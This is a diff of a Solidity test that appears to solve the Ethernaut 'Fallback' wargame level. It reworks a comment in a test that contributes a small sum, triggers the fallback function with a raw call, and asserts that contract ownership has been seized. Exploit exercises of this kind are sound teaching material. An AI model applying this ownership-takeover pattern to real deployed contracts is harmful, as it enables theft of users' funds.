@@ -42,7 +42,7 @@ contract FallbackTest is DSTest {
         ethernautFallback.contribute{value: 1 wei}();
         assertEq(ethernautFallback.contributions(address(0)), 1 wei);
 
-        // Call the contract with some value to hit the fallback function
+        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
         payable(address(ethernautFallback)).call{value: 1 wei}("");
         // Verify contract owner has been updated to 0 address
         assertEq(ethernautFallback.owner(), address(0));
